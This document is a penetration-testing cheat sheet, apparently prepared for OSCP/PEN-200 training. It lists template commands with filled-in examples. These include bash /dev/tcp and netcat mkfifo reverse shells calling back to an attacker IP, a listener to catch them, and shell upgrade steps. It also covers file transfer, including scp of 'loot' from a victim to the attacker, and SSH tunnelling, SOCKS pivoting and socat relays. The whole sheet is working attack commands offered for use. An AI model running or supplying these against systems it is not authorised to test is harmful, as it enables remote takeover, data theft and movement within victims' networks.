
---
Description :
     Bash TCP reverse shell

Parameters : #attacker-ip #attacker-port

```cmd
bash -c 'bash -i >& /dev/tcp/{{attacker-ip}}/{{attacker-port}} 0>&1'
```

```example
bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
```

Tags :  #linux #reverse-shell #oscp #pen-200

---

Description :
     Netcat traditional listener (attacker)

Parameters : #attacker-port

```cmd
nc -lvnp {{attacker-port}}
```

```example
nc -lvnp 4444
```

Tags :  #linux #nc #reverse-shell #oscp #pen-200

---

Description :
     Netcat reverse shell (mkfifo)

Parameters : #attacker-ip #attacker-port

```cmd
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{attacker-ip}} {{attacker-port}} >/tmp/f
```

```example
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f
```

Tags :  #linux #nc #reverse-shell #oscp #pen-200

---

Description :
     Python3 PTY upgrade one-liner (after shell)

Parameters :

```cmd
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```example
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Tags :  #linux #pty #oscp #pen-200

---

Description :
     Stabilize shell — background nc raw (run in victim after python pty)

Parameters :

```cmd
stty raw -echo; fg
```

```example
stty raw -echo; fg
```

Tags :  #linux #pty #tty #oscp #pen-200

---

Description :
     Python3 HTTP server (cwd)

Parameters : #attacker-port

```cmd
python3 -m http.server {{attacker-port}}
```

```example
python3 -m http.server 8000
```

Tags :  #linux #transfer #http #oscp #pen-200

---

Description :
     wget recursive mirror to current directory

Parameters : #url

```cmd
wget -r -np -nH -R index.html "{{url}}"
```

```example
wget -r -np -nH -R index.html "http://10.10.14.2:8000/"
```

Tags :  #linux #wget #transfer #oscp #pen-200

---

Description :
     SCP file upload to attacker (from victim if scp exists)

Parameters : #file #username #target-ip #directory

```cmd
scp {{file}} {{username}}@{{target-ip}}:{{directory}}
```

```example
scp loot.zip kali@10.10.14.2:/home/kali/
```

Tags :  #linux #scp #transfer #oscp #pen-200

---

Description :
     SSH local port forward (Kali)

Parameters : #target-port #target-ip #attacker-port

```cmd
ssh -N -L 0.0.0.0:{{attacker-port}}:127.0.0.1:{{target-port}} user@{{target-ip}}
```

```example
ssh -N -L 0.0.0.0:3389:127.0.0.1:3389 user@10.10.10.10
```

Tags :  #linux #ssh #tunnel #pivot #oscp #pen-200

---

Description :
     SSH dynamic SOCKS proxy

Parameters : #attacker-port #username #target-ip

```cmd
ssh -N -D 0.0.0.0:{{attacker-port}} {{username}}@{{target-ip}}
```

```example
ssh -N -D 0.0.0.0:1080 user@10.10.10.10
```

Tags :  #linux #ssh #tunnel #proxy #oscp #pen-200

---

Description :
     Socat encrypted relay example listener

Parameters : #attacker-port

```cmd
socat OPENSSL-LISTEN:{{attacker-port}},cert=server.pem,verify=0,fork STDOUT
```

```example
socat OPENSSL-LISTEN:4433,cert=server.pem,verify=0,fork STDOUT
```

Tags :  #linux #socat #tunnel #oscp #pen-200

---
